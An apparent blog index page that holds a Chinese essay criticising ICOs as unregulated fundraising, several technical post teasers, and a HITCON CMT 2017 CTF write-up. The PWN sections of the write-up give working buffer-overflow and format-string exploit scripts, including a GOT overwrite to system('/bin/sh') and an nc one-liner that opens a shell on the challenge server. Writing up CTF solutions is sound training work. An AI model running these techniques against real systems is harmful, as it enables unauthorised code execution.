                <a class="post-title-link" href="/2017/09/lua/" itemprop="url">进入Lua的世界</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-03T14:49:22+00:00">
                2017-09-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">语言</span>
                  </a>
                </span>

                
                
                  , 
                

              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/Lua/" itemprop="url" rel="index">
                    <span itemprop="name">Lua</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>Lua 是一个扩展式程序设计语言，作为一个强大、轻量的脚本语言，可以嵌入任何需要的程序中使用。Lua 被设计成一种动态类型语言，且它的语法相对较简单，这里只介绍其基本语法和使用方法，更多信息见 <a target="_blank" rel="noopener" href="http://cloudwu.github.io/lua53doc/manual.html">Lua 5.3 参考手册</a>。</p>
<p><img src="//www.fanhaobai.com/2017/09/lua/c391629e-be21-4038-ab25-b47fe368daeb.jpg">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/09/lua/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017-09-02-talk-about-ico/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017-09-02-talk-about-ico/" itemprop="url">我理解的 ICO</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-02T15:07:20+00:00">
                2017-09-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/summary/" itemprop="url" rel="index">
                    <span itemprop="name">summary</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <p>最近新闻上 ICO 很火，出于好奇，我研究了一下 ICO，分享一下我的看法。</p>
<h2 id="什么是-ICO"><a href="#什么是-ICO" class="headerlink" title="什么是 ICO"></a>什么是 ICO</h2><p>首先我们需要搞清楚 ICO 是什么。网上有一句很混蛋的话：「看懂 ICO 的都忙着挣钱去了」，好像这个事情多么难懂。但随后研究下来，我觉得 ICO 并不复杂。稍加分析，我们很容易就能理解它是什么。</p>
<p>我用 Google 查到了一个 ICO 的中文解释，我们先看看，稍后再分析一下：</p>
<blockquote>
<p>ICO（全称 Initial Coin Offering，首次代币发行众筹）就是区块链界的 IPO，一般是指区块链相关的初创项目在 ICO 平台上发行该项目独有的加密代币（对应 IPO 中的股票），投资者则使用数字货币（如比特币、以太币）购买该项目的代币，实现募资。投资人手中持有的代币代表其持有的股权份额，随着项目成果落地，这些代币作为交易媒介和权益的价值也不断提升，并且可以转让。</p>
</blockquote>
<p>好了，我们再来分析一下这个定义。</p>
<h2 id="交易的计价货币及影响"><a href="#交易的计价货币及影响" class="headerlink" title="交易的计价货币及影响"></a>交易的计价货币及影响</h2><p>在定义中， ICO 必须使用数字货币购买。这种设计其实是增加了代币价格波动的风险，因为很多数字货币（包括比特币）本身价格就不稳定。ICO 基于一个价格波动剧烈的货币之上，自然就会受到相关数字货币的波动影响。而如果以法定货币（比如人民币）来交易，明显可以避免这种风险。</p>
<p>那么为什么 ICO 要选择数字货币呢？我个人认为是为了规避各种金融机构的监管。在中国以及一些别的国家，如果将 ICO 视为股权众筹或者证券发行，理应有证监会监管；但是 ICO 募集的资金不是法币而是数字虚拟货币，数字货币又应该由央行监管。ICO 这样的规则使得在中国可以规避掉监管主体，所以才会滋生出各种非法集资的现象。</p>
<p>在规避监管主体的同时，ICO 也规避掉了相关的监管法规。股权众筹或者证券发行其实有大量的法律存在，比如国内有《中国证券投资基金法》，这使得大家在做事情的时候有规则可以依据。但是 ICO 这种机制使得它可以随意制定自己的规则。</p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>举个例子：</p>
<p>如果我通过 ICO 发行一批代币，规定一年之后以 10% 的利率回购。那么我其实是发行了一个年化收益 10% 的债券。如果我允许在回购之前大家可以交易这个代币，那么相当于做了一个可交易的债券。</p>
<p>如果我不承诺回购，但是承诺以后可以分红，也可以交易，那么我其实是发行了一个类似没有投票权的股票。</p>
<p>我也可以把 ICO 发行的代币承诺为公司的股权，那么其实我的行为就类似于股权融资了。只是这个代币无需等待公司上市就可以随意交易，同时也规避了国内对于未上市公司股东数量的限制。</p>
<p>我也可以不承诺任何的分红，也不承诺代币持有者的股东身份。那么代币的价值完全就和企业的业绩无关了。按理说这样的 ICO 应该没有人买才对，但是追捧的人其实并不少。</p>
<p>下面我们看一个实际的 ICO 项目：PressOne。</p>
<h2 id="PressOne-项目"><a href="#PressOne-项目" class="headerlink" title="PressOne 项目"></a>PressOne 项目</h2><p>在比特币名人李笑来的 ICO 项目 <a target="_blank" rel="noopener" href="https://press.one/cn">PressOne</a> 的介绍上，我没有看到任何对于该项目的代币持有者所具有的股东权利的描述，只看到一个暂定的可转账交易的时间：2018 年 7 月 12 日。见：<a target="_blank" rel="noopener" href="https://press.one/pub_cn">https://press.one/pub_cn</a> 。</p>
<p>在分红权利上，PressOne 只介绍了 40 亿枚代币投资的项目有收益分红（下图）。而 PressOne 本身公司的经营收益如何分配，并未提及。</p>
<img src="/images/talk-about-ICO-e227c.png" class="">

<p>在该项目的代币权利明显较弱的同时，2 亿美元的融资额却远超大多数国内的上规模的创业公司。我所在的猿辅导公司估值 10 亿美金，但是到现在的融资最多一次也只有 1.2 亿美元。</p>
<p>有人说你是不是看着别人融资额比你高眼红，所以才写这样的文章？其实不是的。</p>
<p>我看了李笑来的那个项目，说实话我还挺感兴趣。我也很喜欢李笑来的书，我也相信李笑来不会主观恶意骗大家的钱。我只是觉得，市场对于这种事情太不理性了。对于一个只有概念的想法，给出一个定价超高，没有股东权利的融资方案，虽然说买卖是一个愿打一个愿挨的生意，但是稍微有点风险意识的人，应该看出这样的项目其实风险非常高。</p>
<p>就连李笑来本人可能都认为投资者太疯狂了。在 PressOne 的官网上，没有项目的详细白皮书，但是却有关于该项目风险的明确提示。另外 PressOne 还提供了一个开放 24 小时的退出机会。我相信李笑来也希望 PressOne 的投资者是理性的，有风险意识的，这样对于项目的成功和失败才会更加坦然，而不是抱着投机的心态。</p>
<img src="/images/talk-about-ICO-911fc.png" class="">

<h2 id="ICO-规则的灵活性风险"><a href="#ICO-规则的灵活性风险" class="headerlink" title="ICO 规则的灵活性风险"></a>ICO 规则的灵活性风险</h2><p>大家看到了，由于 ICO 规避了相关法规，又可以极大地随意制定规则。如果你愿意发挥想象力，或许你还能设计出具有 “传销” 规则的 ICO 发行方案。这样的事情在完全没有监管下发展，实在不可能有什么好的结果。</p>
<p>由于 ICO 的规则变化灵活，对确定监管主体和相关法规带来了难度。在国外，美国和新加坡都将 ICO 采取逐案评估的办法。而在中国，由于是新事物，国家的政策没有出来。但是至少我们可以看到，近期国家已经开始相关的监管工作了：一场本应于 9 月 2 日召开的区块链盛会被有关部门叫停，与此同时 ICOINFO 宣布暂停了 ICO 业务，比特币中国暂停 ICOCOIN 交易：</p>
<img src="/images/talk-about-ICO-7c79e.png" class="">

<img src="/images/talk-about-ICO-8cd82.png" class="">

<p>另外，据财新的报道，ICO 被监管认为是变相的非法集资。</p>
<img src="/images/talk-about-ICO-f73f2.png" class="">

<p>事情的发展看起来越来越明显了，国家显然也看到了 ICO 带来的风险，并且希望加强监管，我相信相关的法规会很快出台。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结说来，ICO 就是企业为了筹集资金，在 ICO 平台上发行以电子货币交易的代币。代币可以制定灵活的交易锁定期，分红权，投票权，回购权。由于缺乏监管，所以容易滋生非法融资行为。代币的交易基于区块链技术，所以非常安全和方便。</p>
<p>ICO 在中国缺乏相关法规，亟待引入监管，以避免鱼龙混杂的情况。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Initial_coin_offering">Initial coin offering</a></li>
<li><a target="_blank" rel="noopener" href="http://3g.163.com/dy/article/CT67TI4M05118K7K.html">ICO，披着金融创新的币圈传销？监管刻不容缓！</a></li>
<li><a target="_blank" rel="noopener" href="https://ico.info/">ICOINFO 官网</a></li>
<li><a target="_blank" rel="noopener" href="https://press.one/cn">PressOne 官网</a></li>
</ul>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/09/xdebug-in-docker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/xdebug-in-docker/" itemprop="url">在Docker中使用Xdebug</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-01T15:23:55+00:00">
                2017-09-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">语言</span>
                  </a>
                </span>

                
                
                  , 
                

              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/PHP/" itemprop="url" rel="index">
                    <span itemprop="name">PHP</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>我们经常会使用 PhpStorm 结合 Xdebug 进行代码断点调试，这样能追踪程序执行流程，方便调试代码和发现潜在问题。博主将开发环境迁入 Docker 后，Xdebug 调试遇到了些问题，在这里整理出 Docker 中使用 Xdebug 的方法和注意事项。</p>
<p><img src="https://www.fanhaobai.com/2017/09/xdebug-in-docker/07490b33-a2a3-491d-b325-cf8bfb9c9542.gif">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/09/xdebug-in-docker/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/08/redis-pipelining/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/redis-pipelining/" itemprop="url">使用Redis管道提升性能</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-31T06:10:35+00:00">
                2017-08-31
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/DB/" itemprop="url" rel="index">
                    <span itemprop="name">DB</span>
                  </a>
                </span>

                
                
                  , 
                

              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/DB/Redis/" itemprop="url" rel="index">
                    <span itemprop="name">Redis</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>Redis 的 <a target="_blank" rel="noopener" href="https://redis.io/topics/pipelining">管道</a> （pipelining）是用来打包多条无关命令批量执行，以减少多个命令分别执行带来的网络交互时间。在一些批量操作数据的场景，使用管道可以显著提升 Redis 的读写性能。</p>
<p><img src="http://www.fanhaobai.com/2017/08/redis-pipelining/abc8ae13-9f76-4cd0-902d-a4fbb9fedd4f.png" alt="预览图">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/08/redis-pipelining/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/HITCON-CMT-2017/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/HITCON-CMT-2017/" itemprop="url">HITCON CMT 2017</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-27T15:05:00+00:00">
                2017-08-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h1 id="HITCON-CMT-2017-社群議程-投影片"><a href="#HITCON-CMT-2017-社群議程-投影片" class="headerlink" title="HITCON CMT 2017 社群議程 投影片"></a>HITCON CMT 2017 社群議程 投影片</h1><p><a target="_blank" rel="noopener" href="https://speakerdeck.com/oalieno/shen-tou-ce-shi-ji-ben-ji-qiao-yu-jing-yan-fen-xiang">Speaker Deck</a><br><a target="_blank" rel="noopener" href="https://www.slideshare.net/ssuserd44fa2/ss-79172936">SlideShare</a></p>
<h1 id="HITCON-CMT-2017-闖關題目-writeups"><a href="#HITCON-CMT-2017-闖關題目-writeups" class="headerlink" title="HITCON CMT 2017 闖關題目 writeups"></a>HITCON CMT 2017 闖關題目 writeups</h1><h2 id="FORENSICS-100"><a href="#FORENSICS-100" class="headerlink" title="FORENSICS-100"></a><a target="_blank" rel="noopener" href="https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/59">FORENSICS-100</a></h2><ol>
<li><p>題目說圖片被剪裁過，另外圖片的名稱是 <code>height_is_weird.png</code>，因此可以推測是高度被裁減過，需要改 png header 中的高度，讓不見的 flag 被顯現出來</p>
</li>
<li><p>需要了解 png 的編碼方式，找到圖片高度在 header 裡的位置，可以參考<a target="_blank" rel="noopener" href="http://blog.csdn.net/hherima/article/details/45847043">這裡</a></p>
</li>
<li><p>由 png 協定可知，圖中的 35A 與 152 分別為此圖的寬與高<br> <img src="https://i.imgur.com/BXIel9j.png"></p>
</li>
<li><p>運用一些可以直接修改檔案真正的值的軟體 ( 如 : hexedit )，對 152 做竄改，將數值調高</p>
</li>
</ol>
<p><strong>這題要注意的是，出題者改高度沒有重新計算 CRC 檢驗碼，是想讓大家發現圖片有被改過的跡象，有些圖片解碼器對 png 做的 check 比較嚴格 ( ex. Mac 的預覽程式 )，可能會出現高度調超過真實高度或是發現 CRC 檢驗碼不正確會 crash 或完全不能讀的狀況(也就是你完全讀不了下載出來的檔案 @@)</strong></p>
<h2 id="PWN-100"><a href="#PWN-100" class="headerlink" title="PWN-100"></a><a target="_blank" rel="noopener" href="https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/60">PWN-100</a></h2><p>這題是最基礎的 buffer overflow 題目</p>
<h3 id="解題思路"><a href="#解題思路" class="headerlink" title="解題思路 :"></a>解題思路 :</h3><p>目標是讓 to_be_overflow 等於 0xABCD1234 而拿到 shell<br>我們可以在原始碼中看到 <code>char text[40];</code> 和 <code>int to_be_overflowed</code> 是接在一起的<br>但是我們怎麼確認他們在記憶體上真的接在一起呢?</p>
<p><img src="https://i.imgur.com/1fCBCU7.png" alt="objdump"></p>
<p>我們先用 objdump 來看一下 assembly ( 其他可以看 assembly 的工具都可以用喔 )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lea eax,[ebp-0x34]</span><br><span class="line">push eax</span><br></pre></td></tr></table></figure>

<p>這行是在 call gets 函式之前把 gets 的參數放到 stack 的行為<br>對照原始碼就可以發現 ebp-0x34 就是我們的 text 在 stack 上的位址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp DWORD PTR [ebp-0xc],0xabcd1234</span><br></pre></td></tr></table></figure>

<p>這行等於是原始碼的 <code>if(to_be_overflowed == 0xabcd1234)</code><br>所以 ebp-0xc 就是我們的 to_be_overflowed 的位址<br><code>0x34 - 0xc = 0x28 = 40</code> 剛剛好他們之間的距離就是 text 這個陣列的大小，也就代表他們真的緊鄰依偎著彼此直到<del>世界</del>程式的終結</p>
<p>既然他們依偎在一起，而且 gets 這個函式不會檢查輸入的字串有多長 ( buffer overflow 的核心想法 )<br>那我們只要先輸入 40 個字，然後不按 Enter，再繼續輸入下去的字就會剛好蓋到 to_be_overflowed</p>
<h3 id="需要注意的小地方"><a href="#需要注意的小地方" class="headerlink" title="需要注意的小地方"></a>需要注意的小地方</h3><ol>
<li>是 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F">little endian</a> 喔</li>
<li>恩</li>
</ol>
<h3 id="程式碼"><a href="#程式碼" class="headerlink" title="程式碼"></a>程式碼</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">useless = <span class="number">0xABCD1234</span></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * offset + p32(<span class="number">0xABCD1234</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;bamboofox.cs.nctu.edu.tw&#x27;</span>,<span class="number">22001</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>使用好用的 <a target="_blank" rel="noopener" href="https://github.com/Gallopsled/pwntools">pwntools</a> 做連線送 payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( python -c <span class="string">&quot;print &#x27;A&#x27; * 40 + chr(0x34) + chr(0x12) + chr(0xCD) + chr(0xAB)&quot;</span> ; <span class="built_in">cat</span> ) | nc bamboofox.cs.nctu.edu.tw 22001</span><br></pre></td></tr></table></figure>

<p>直接把字元印出來 pipe 到 nc 指令<br>後面的 cat 是為了能讓你跟你拿到的 shell 互動<br>因為 cat 這個指令本身直接用不接檔案會像是一個 echo server，也就是你打什麼 cat 回什麼<br>然後再 pipe 到後面的 nc 就形成一個完美的互動式介面</p>
<h2 id="PWN-200"><a href="#PWN-200" class="headerlink" title="PWN-200"></a><a target="_blank" rel="noopener" href="https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/61">PWN-200</a></h2><p>這題是一題簡單 format string + buffer overflow 的應用<br>可以參考我們的<a target="_blank" rel="noopener" href="https://youtu.be/FvGhDlK36PI">社課連結</a></p>
<h3 id="觀察"><a href="#觀察" class="headerlink" title="觀察"></a>觀察</h3><ol>
<li>先看一下原始碼，如果我們能跳去執行 <code>canary_protect_me</code> 這個函式，我們就可以拿到 shell 了</li>
<li>這題有開 <a target="_blank" rel="noopener" href="http://yunnigu.dropsec.xyz/2017/03/20/Liunx%E4%B8%8B%E5%85%B3%E4%BA%8E%E7%BB%95%E8%BF%87cancry%E4%BF%9D%E6%8A%A4%E6%80%BB%E7%BB%93/">canary 保護</a></li>
<li>原始碼中出現 <code>printf(buf);</code>，存在 format string 的漏洞</li>
</ol>
<h3 id="解題思路-1"><a href="#解題思路-1" class="headerlink" title="解題思路"></a>解題思路</h3><p>先用 format string 漏洞 leak 出 canary，就可以用 buffer overflow 蓋掉 return address 進而跳到 canary_protect_me 這個函式成功拿到 shell</p>
<h3 id="程式碼-1"><a href="#程式碼-1" class="headerlink" title="程式碼"></a>程式碼</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;bamboofox.cs.nctu.edu.tw&#x27;</span>,<span class="number">22002</span>)</span><br><span class="line"></span><br><span class="line">func = <span class="number">0x0804854d</span></span><br><span class="line">r.sendline(<span class="string">&#x27;%15$x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(r.recv(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">40</span> + p32(canary) + <span class="string">&#x27;B&#x27;</span>*<span class="number">12</span> + p32(func)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="PWN-300"><a href="#PWN-300" class="headerlink" title="PWN-300"></a><a target="_blank" rel="noopener" href="https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/62">PWN-300</a></h2><p>這題同樣有 format string 的漏洞，第一次 gets, printf 用 format string 把 printf 的 GOT 蓋成 system 的函式位址，第二次 gets, printf 直接輸入 <code>/bin/sh</code> 就等於是，<code>system(&quot;/bin/sh&quot;)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x804a00c</span></span><br><span class="line">system_plt_high = <span class="number">0x0804</span></span><br><span class="line">system_plt_low  = <span class="number">0x8410</span></span><br><span class="line">offset = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">payload = p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload += p32(printf_got)</span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>(system_plt_high - <span class="number">8</span>, offset)</span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>(system_plt_low - system_plt_high, offset+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;bamboofox.cs.nctu.edu.tw&#x27;</span>, <span class="number">22003</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="CRYPTO-100"><a href="#CRYPTO-100" class="headerlink" title="CRYPTO-100"></a><a target="_blank" rel="noopener" href="https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/64">CRYPTO-100</a></h2><p>解題可以寫 python script 或直接用<a target="_blank" rel="noopener" href="http://temp.crypo.com/">線上工具</a> (應該是最簡單的一題 XD)</p>
<ol>
<li>看到很多 0101，猜測是 binary，try 一下應該是什麼的 binary，這題是 ascii 的 binary</li>
<li>發現新字串有 <code>=</code> 結尾，猜測是 base64 的 padding</li>
<li>base64 decrype 完後，找到 <code>BBAMOOOF#X&#123;cpR-Y&#125;.T0</code>，因為有提示 轉置密碼 &amp; FLAG 的形式是 : BAMBOOFOX{未知字串}，所以要找幾個字元一組</li>
<li>發現四個字元一組 &amp;&amp; encrypt role 是 [1,2,3,0] &#x3D;&gt; 切開來做旋轉，即可找到 Flag</li>
</ol>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

